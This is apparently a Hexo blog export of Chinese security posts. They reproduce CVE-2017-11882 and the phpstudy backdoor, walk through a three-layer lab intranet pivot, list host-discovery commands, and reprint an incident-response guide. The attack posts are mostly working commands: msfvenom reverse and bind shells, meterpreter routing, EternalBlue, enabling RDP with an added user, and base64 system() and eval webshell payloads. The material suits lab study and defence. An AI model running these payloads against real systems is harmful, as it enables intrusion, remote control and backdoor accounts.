{"meta":{"title":"copyking","subtitle":"👾👾👾","description":"","author":"zy","url":"http://yoursite.com","root":"/"},"pages":[{"title":"分类","date":"2020-07-29T09:01:00.515Z","updated":"2020-07-29T09:00:34.383Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"CVE-2017-11882漏洞复现","slug":"CVE-2017-11882漏洞复现","date":"2020-07-31T09:00:57.650Z","updated":"2020-07-31T09:09:32.593Z","comments":true,"path":"2020/07/31/CVE-2017-11882漏洞复现/","link":"","permalink":"http://yoursite.com/2020/07/31/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"CVE-2017-11882 office漏洞 钓鱼","text":"CVE-2017-11882 office漏洞 钓鱼 CVE-2017-11882漏洞复现漏洞概述2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。此漏洞是由Office软件里面的 [公式编辑器] 造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行。且漏洞利用完美无弹窗，无视宏，影响Ms offcie全版本，对于企业来说危害很大 影响版本：office 2003office 2007office 2010office 2013office 2016 复现环境渗透机: Kali Linux 靶机: Win10 + Office 2016 POC: https://github.com/unamer/CVE-2017-11882/ (注: 复现过程都在关闭win10自带杀软windows defender 的”实时保护”下进行) 复现过程开启kali下载POC代码，进入POC代码目录 执行 python CVE-2017-11882.py -c \"cmd.exe /c calc.exe\" -o test.doc 将会生成test.doc文件 把 test.doc文件拉到靶机win10上并打开，若弹出计算机，则表示存在漏洞（以此验证offce漏洞） 进一步利用：配合MSF来反弹会话 准备阶段： kali ip : 192.168.18.135 win10 ip 192.168.18.128 Kali 启动msfconsole执行 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.18.135 LPORT=4444 -o test.bin 生成一个名为test.bin的msf payload 将payload植入文件 返回POC目录执行下执行 python CVE-2017-11882.py -c test.bin -t 0 -i 1 -o test1.doc 生成 一个带有msfpayload的doc文件test1.doc 反弹会话 MSF启动监听: use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.18.135 set lport 4444 run 把生成的test1.doc文件拉到win10 并打开，可以看到成功反弹回会话 会话进程文件 漏洞修复1在线更新；开启Windows Update更新，这种方式对于大部分人来说就够了。 2打补丁；此漏洞对应的微软补丁地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"内网","slug":"内网","permalink":"http://yoursite.com/categories/%E5%86%85%E7%BD%91/"}],"tags":[]},{"title":"内网探测存活主机","slug":"内网探测存活主机","date":"2020-07-31T08:40:45.253Z","updated":"2020-07-31T09:02:40.936Z","comments":true,"path":"2020/07/31/内网探测存活主机/","link":"","permalink":"http://yoursite.com/2020/07/31/%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA/","excerpt":"内网渗透之探测存活主机！","text":"内网渗透之探测存活主机！ –ICMP协议——Windows CMDfor /l %i in (1,1,255) do @ ping 192.168.18.%i -w 1 -n 1|find /i \"ttl=\" &gt;&gt; E:\\a.txt LINUX shellvi ping.sh #!/bin/bash ip=\"192.168.18.\" echo \"ping log:\" &gt; ./ping.txt for i in {1..254} do ping -c 1 -w 1 -W 1 $ip$i | grep -q \"ttl=\" &amp;&amp; echo \"$ip$i [yes]\" &gt;&gt; ./ping.txt || echo \"$ip$i [no]\" &gt;&gt; ./ping.txt &amp; done echo \"wait 5s....\" sleep 5 cat ./ping.txt cat ./ping.txt | wc -l Nmapnmap 192.168.18.0/24 -sP 注： windows 防火墙策略需要允许回显，默认禁止。火绒默认允许 –ARP协议——–arp 缓存表arp -a arp-scan（windows）arpscan.exe -t 192.168.18.0/24 arp-scan（linux）arp-scan 192.168.18.0/24 Nmapnmap -PR 192.168.18.0/24 -sn –NetBios协议———-windows CMDnbtstat -A 192.168.18.128 nbtscan(winodws)nbtscan.exe 192.168.18.0/24 nbtscan(linux)./nbtscan 192.168.18.0/24 Nmapnmap --script nbstat.nse 192.168.18.0/24 -p 135 注：windows 防火墙策略需要允许回显，默认禁止。火绒默认允许 netbios协议 需设置启用，默认启用 –SNMP协议———-Nmapnmap --script snmp-brute 192.168.18.0/24 -sn document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"内网","slug":"内网","permalink":"http://yoursite.com/categories/%E5%86%85%E7%BD%91/"}],"tags":[]},{"title":"一个实验了解多层内网渗透","slug":"一个实验了解多层内网渗透","date":"2020-07-31T08:36:41.562Z","updated":"2020-07-31T09:14:53.329Z","comments":true,"path":"2020/07/31/一个实验了解多层内网渗透/","link":"","permalink":"http://yoursite.com/2020/07/31/%E4%B8%80%E4%B8%AA%E5%AE%9E%E9%AA%8C%E4%BA%86%E8%A7%A3%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"了解内网渗透基本操作","text":"了解内网渗透基本操作 一个实验了解多层内网渗透实验简介网络拓扑图： 渗透机：win10+kali 第一层靶机 (外网web服务器): Linux 第二场靶机 (内网web服务器): Linux 第三层靶机 (内网办公机) : win7 用三层网络来模拟内外网环境,主要了解MSF、内网转发等 环境搭建第一层网络 把渗透机kali和win10网卡1设置选择VMnet1： 靶机Linux网卡1设置选择VMnet1，添加网卡2 设置选择VMnet2： 第二层网络 将第二台靶机linux网卡1设置选择VMnet2，添加网卡2 设置选择VMnet3： 第三层网络 将靶机win7网卡1设置选择VMnet3： 再配置好各台机器对应IP即可 在第一台linux和第二台linux上搭建一个php上传页面，设为存在文件上传漏洞的web页面，以便后续的拿shell进行内网渗透 第一台linux 第二台linux 实验过程第一层靶机Win10访问http://192.168.85.131/ 直接上传一句话木马 蚁剑连接 进一步做内网渗透，上传msf后门 打开kali msfconsole 输入 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.85.128 LPORT=4444 -f elf &gt; mshell.elf 生成一个名为mshell.elf的msf后门文件 蚁剑把后门文件上传到linux靶机 返回msf 开启监听 use exploit/multi/handler // 使用监听模块 set payload linux/x64/meterpreter/reverse_tcp // 使用和木马相同的payload set lhost 192.168.85.128 //kaili 的ip set lport 4444 // 木马的端口 run // 执行 蚁剑打开虚拟终端cd到后门文件的目录下,执行后门文件，输入 chmod 777 mshell.elf 加执行权限 ./mshell.elf 执行文件 Kail接受到MSF会话 输入ifconfig，发现第二层172.10.10.0/24网段 添加路由 background //将会话转到后台 route add 172.10.10.0/24 1 //添加 172.10.10.0/24网段 使用session1 route print // 查看路由表 使用MSF建立socks代理 use auxiliary/server/socks4a set srvhost 192.168.85.128 set srvport 10080 run 配置socks4代理的相关客户端Proxychains 在配置文件/etc/proxychains.conf中添加 ：socks4 192.168.85.128 10080 vi /etc/proxychains.conf 添加 socks4 192.168.85.128 10080 这样利用proxychains启动的应用都可以带sock4代理 建立好代理后渗透机可以通过这台linux当跳板机进入第二层网络 第二层靶机nmap探测存在web服务的主机 用proxychans 启动nmap对第二层网段进行80端口扫描，执行 proxychains nmap -sT -Pn -p 80 172.10.10.0/24 扫描发现55和56存在web服务，172.10.10.56 即为第二层网络的ip 由于proxychains无法代理icmp的数据包 所以必须添加-sT -Pn参数,即不检测主机是否存活,直接进行端口tcp扫描 脚本探测存活主机 在本地创建一个名为ping.sh的脚本 脚本内容： #!/bin/bash ip=\"172.10.10.\" echo \"ping log:\" &gt; ./ping.txt for i in {1..254} do ​ ping -c 1 -w 1 -W 1 $ip$i | grep -q \"ttl=\" &amp;&amp; echo \"$ip$i [yes]\" &gt;&gt; ./ping.txt || echo \"$ip$i [no]\" &gt;&gt; ./ping.txt &amp; done echo \"wait 5s....\" sleep 5 cat ./ping.txt cat ./ping.txt | wc -l Kali进入session 1会话，然后upload命令上传刚刚创建的脚本到靶机 upload /root/ping.sh /var/www/hrml/upload 进入shell执行 python -c 'import pty;pty.spawn(\"/bin/bash\")' 创建一个交互式shell，后 Chmod 777 ping.sh ./ping.sh 可以看到172.10.10.0/24 网段存活56.57两台 知道存活主机ip后就可以继续进入第二层内网主机 渗透机浏览器配置sock4a代理 通过代理可以访问第二层linux靶机http://172.10.10.56 同样上传一句话php1.php 蚁剑加代理连接 连接 http://172.10.10.56/upload/php1.php 进一步做内网渗透，继续上传msf后门 制作MSF后门 返回kali msf 输入 msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4455 -f elf &gt; mshell1.elf 生成 mshell1.elf 后门文件 因为在内网跨网段时无法反向代理连接到渗透的机器，所以这里使用linux/x64/meterpreter/bind_tcp这个payload进行正向代理连接 蚁剑上传后门 Kali开启监听 蚁剑打开虚拟终端执行后门文件 返回会话 输入ifconfig 发现第三层网络的网段10.10.10.0/24 第三层靶机添加路由 background route add 10.10.10.0/24 2 route print 进入session 2 上传 脚本 探测存活主机 注意把脚本的ip段修改成该网段再上传 探测到第三层网段的存活ip ：10.10.10.101 proxychans 启动nmap对10.10.10.101的1-500端口扫描，执行 proxychains nmap -sT -Pn -p 1-500 10.10.10.101 发现445端口开启 尝试使用ms17-010 use windows/smb/ms17_010_eternalblue set rhost 10.10.10.101 set payload windows/x64/meterpreter/bind_tcp set lport 4466 Run ，存在445漏洞 执行成功，返回会话 开启3389远程桌面 run post/windows/manage/enable_rdp //开启远程桌面 run post/windows/manage/enable_rdp USERNAME=zzy PASSWORD=123qwe!@# //添加远程用户 将3389端口转回kali本地5555端口 portfwd add -l 5555 -p 3389 -r 10.10.10.101 Win10远程桌面连接 登陆成功 结束 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"内网","slug":"内网","permalink":"http://yoursite.com/categories/%E5%86%85%E7%BD%91/"}],"tags":[]},{"title":"phpstudy 后门漏洞复现","slug":"phpstudy 后门漏洞复现","date":"2020-07-29T10:09:37.856Z","updated":"2020-07-31T09:10:58.637Z","comments":true,"path":"2020/07/29/phpstudy 后门漏洞复现/","link":"","permalink":"http://yoursite.com/2020/07/29/phpstudy%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"phpstudy 后门漏洞","text":"phpstudy 后门漏洞 PHPstudy 后门漏洞复现漏洞概述Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户 2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。 影响版本： phpstudy 2016版php-5.2.17phpstudy 2016版php-5.4.45 phpstudy 2018版php-5.2.17 phpstudy 2018版php-5.4.45 后门验证后门代码存在于\\ext\\php_xmlrpc.dll模块中 phpStudy2016路径: php\\php-5.2.17\\ext\\php_xmlrpc.dll php\\php-5.4.45\\ext\\php_xmlrpc.dll phpStudy2018路径: PHPTutorial\\php\\php-5.2.17\\ext\\php_xmlrpc.dll PHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll 用notepad或记事本打开此文件查找eval，文件存在@eval(%s(‘%s’))证明漏洞存在 复现过程访问本地：http://127.0.0.1,用burpsuit进行抓包拦截： 把数据包发送到repeater然后 将请求包中Accept-Encoding里的gzip,逗号后面的空格去掉，不然命令执行不成功。 再添加Accept-Charset。该值就是执行的命令, 需要进行base64编码。 执行命令 将echo system(“whoami”); base64编码：ZWNobyBzeXN0ZW0oIndob2FtaSIpOw== 返回 将 echo system(“net user”); base64编码：ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 返回 蚁剑无文件拿shell 》》》 将一句话木马：eval($_POST[a]); 进行base64编码 ：ZXZhbCgkX1BPU1RbYV0pOw== 密码为: a 打开蚁剑，添加数据 配置HTTP消息头 成功 漏洞修复1 php-5.4.45版本或php-5.2.17版本，替换其中的php_xmlrpc.dll，下载地址： https://windows.php.net/downloads/releases/archives/php-5.2.17-Win32-VC6-x86.zip https://windows.php.net/downloads/releases/archives/php-5.4.45-Win32-VC9-x86.zip 2 官网重新下载安装新的客户端 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"web","slug":"web","permalink":"http://yoursite.com/categories/web/"}],"tags":[]},{"title":"应急响应","slug":"应急响应","date":"2020-07-28T09:52:43.855Z","updated":"2020-07-31T09:04:21.864Z","comments":true,"path":"2020/07/28/应急响应/","link":"","permalink":"http://yoursite.com/2020/07/28/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","excerpt":"来自 《Bypass公众号》 的应急响应指南","text":"来自 《Bypass公众号》 的应急响应指南 第一章：入侵排查篇第1篇：window入侵排查0x00 前言当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 常见的应急响应事件分类： web入侵：网页挂马、主页篡改、Webshell 系统入侵：病毒木马、勒索软件、远控后门 网络攻击：DDOS攻击、DNS劫持、ARP欺骗 针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Window服务器入侵排查的思路。 0x01 入侵排查思路1.1 检查系统账号安全1、查看服务器是否有弱口令，远程管理端口是否对公网开放。 检查方法：据实际情况咨询相关服务器管理员。 2、查看服务器是否存在可疑账号、新增账号。 检查方法：打开 cmd 窗口，输入lusrmgr.msc命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 3、查看服务器是否存在隐藏账号、克隆账号。 检查方法： a、打开注册表 ，查看管理员对应键值。 b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。 4、结合日志，查看管理员登录时间、用户名是否存在异常。 检查方法： a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。 b、导出Windows日志–安全，利用Log Parser进行分析。 1.2 检查异常端口、进程1、检查端口连接情况，是否有远程连接、可疑连接。 检查方法： a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID” 2、进程 检查方法： a、开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。 b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。 c、通过微软官方提供的 Process Explorer 等工具进行排查 。 d、查看可疑的进程及其子进程。可以通过观察以下内容： 没有签名验证信息的进程 没有描述信息的进程 进程的属主 进程的路径是否合法 CPU或内存资源占用长时间过高的进程 3、小技巧： ​ a、查看端口对应的PID： netstat -ano | findstr “port” ​ b、查看进程对应的PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID” ​ c、查看进程对应的程序位置： ​ 任务管理器–选择对应进程–右键打开文件位置 ​ 运行输入 wmic，cmd界面 输入 process ​ d、tasklist /svc 进程–PID–服务 ​ e、查看Windows服务所对应的端口：​ %system%/system32/drivers/etc/services（一般%system%就是C:\\Windows） 1.3 检查启动项、计划任务、服务1、检查服务器是否有异常的启动项。 检查方法： a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。b、单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：HKEY_CURRENT_USER\\software\\micorsoft\\windows\\currentversion\\runHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。 d、利用安全软件查看启动项、开机时间管理等。 e、组策略，运行gpedit.msc。 2、检查计划任务 检查方法： a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。 b、单击【开始】&gt;【运行】；输入 cmd，然后输入at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。 3、服务自启动 检查方法：单击【开始】&gt;【运行】，输入services.msc，注意服务状态和启动类型，检查是否有异常服务。 1.4 检查系统相关信息1、查看系统版本以及补丁信息 检查方法：单击【开始】&gt;【运行】，输入systeminfo，查看系统信息 2、查找可疑目录及文件 检查方法： a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。 ​ Window 2003 C:\\Documents and Settings ​ Window 2008R2 C:\\Users\\ b、单击【开始】&gt;【运行】，输入%UserProfile%\\Recent，分析最近打开分析可疑文件。 c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 d、回收站、浏览器下载目录、浏览器历史记录 e、修改时间在创建时间之前的为可疑文件 3、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ ​ a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。 ​ b、利用计算机自带文件搜索功能，指定修改时间进行搜索。 1.5 自动化查杀 病毒查杀 检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。 webshell查杀 检查方法：选择具体站点路径进行webshell查杀，建议使用两款webshell查杀工具同时查杀，可相互补充规则库的不足。 1.6 日志分析系统日志 分析方法： a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 b、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。 C、导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。 WEB访问日志 分析方法： a、找到中间件的web日志，打包到本地方便进行分析。 b、推荐工具：Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。 ​ Linux下，使用Shell命令组合查询分析 0x02 工具篇2.1 病毒分析PCHunter：http://www.xuetr.com 火绒剑：https://www.huorong.cn Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker：https://processhacker.sourceforge.io/downloads.php autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL：https://www.bleepingcomputer.com/download/otl/ SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector 2.2 病毒查杀卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库） 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库） 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html 2.3 病毒动态CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn 微步在线威胁情报社区：https://x.threatbook.cn 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html 爱毒霸社区：http://bbs.duba.net 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html 2.4 在线病毒扫描网站http://www.virscan.org //多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎 https://habo.qq.com //腾讯哈勃分析系统 https://virusscan.jotti.org //Jotti恶意软件扫描系统 http://www.scanvir.com //针对计算机病毒、手机病毒、可疑文件等进行检测分析 2.5 webshell查杀D盾_Web查杀：http://www.d99net.net/index.asp 河马webshell查杀：http://www.shellpub.com 深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html Safe3：http://www.uusec.com/webshell.zip 第2篇：Linux入侵排查0x00 前言当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。 针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。 0x01 入侵排查思路1.1 账号安全基本使用： 1、用户信息文件/etc/passwd root:x:0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell 用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell 注意：无密码只允许本机登陆，远程不允许登陆 2、影子文件/etc/shadow root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: 用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留 who 查看当前登录用户（tty本地登陆 pts远程登录） w 查看系统信息，想知道某一时刻用户的行为 uptime 查看登陆多久、多少用户，负载 入侵排查： 1、查询特权用户特权用户(uid 为0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2、查询可以远程登录的帐号信息 [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 4、禁用或删除多余及可疑的帐号 usermod -L user 禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 userdel user 删除user用户 userdel -r user 将删除user用户，并且将/home目录下的user目录一并删除 1.2 历史命令基本使用： 通过.bash_history查看帐号执行过的系统命令 1、root的历史命令 histroy 2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令 为历史的命令增加登录的IP地址、执行命令时间等信息： 1）保存1万条命令 sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile 2）在/etc/profile的文件尾部添加如下行数配置信息： ######jiagu history xianshi######### USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ \"$USER_IP\" = \"\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\" ######### jiagu history xianshi ########## 3）source /etc/profile让配置生效 生成效果： 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 3、历史操作命令的清除：history -c 但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。 入侵排查： 进入用户目录下 cat .bash_history &gt;&gt; history.txt 1.3 检查异常端口使用netstat 网络连接命令，分析可疑端口、IP、PID netstat -antlp|more 查看下pid所对应的进程文件路径， 运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号） 1.4 检查异常进程使用ps命令，分析进程 ps aux | grep pid 1.5 检查开机启动项基本使用： 系统运行级别示意图： 运行级别 含义 0 关机 1 单用户模式，可以想象为windows的安全模式，主要用于系统修复 2 不完全的命令行模式，不含NFS服务 3 完全的命令行模式，就是标准字符界面 4 系统保留 5 图形模式 6 重启动 查看运行级别命令 runlevel 系统默认允许级别 vi /etc/inittab id=3：initdefault 系统开机后直接进入哪个运行级别开机启动配置文件 /etc/rc.local /etc/rc.d/rc[0~6].d例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。 入侵排查： 启动项文件： more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/ 1.6 检查定时任务基本使用 1、利用crontab创建计划任务 基本命令 crontab -l 列出某个用户cron服务的详细内容 Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务) crontab -e 使用编辑器编辑当前的crontab文件 如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件 2、利用anacron实现异步定时任务调度 使用案例 每天运行 /home/backup.sh脚本： vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh 当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。 入侵排查 重点关注以下目录中是否存在恶意脚本 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/*小技巧： more /etc/cron.daily/* 查看目录下所有文件1.7 检查服务服务自启动 第一种修改方法： chkconfig [--level 运行级别] [独立服务名] [on|off] chkconfig –level 2345 httpd on 开启自启动 chkconfig httpd on （默认level是2345）第二种修改方法： 修改/etc/re.d/rc.local 文件 加入 /etc/init.d/httpd start第三种修改方法： 使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。 入侵排查 1、查询已安装的服务： RPM包安装的服务 chkconfig --list 查看服务自启动状态，可以看到所有的RPM包安装的服务 ps aux | grep crond 查看当前服务 系统在3与5级别下的启动项 中文环境 chkconfig --list | grep \"3:启用\\|5:启用\" 英文环境 chkconfig --list | grep \"3:on\\|5:on\"源码包安装的服务 查看服务安装位置 ，一般是在/user/local/ service httpd start 搜索/etc/rc.d/init.d/ 查看是否存在1.8 检查异常文件1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ ​ 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件 3、针对可疑文件可以使用stat进行创建修改时间。 1.9 检查系统日志日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf 日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 日志分析技巧： 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: 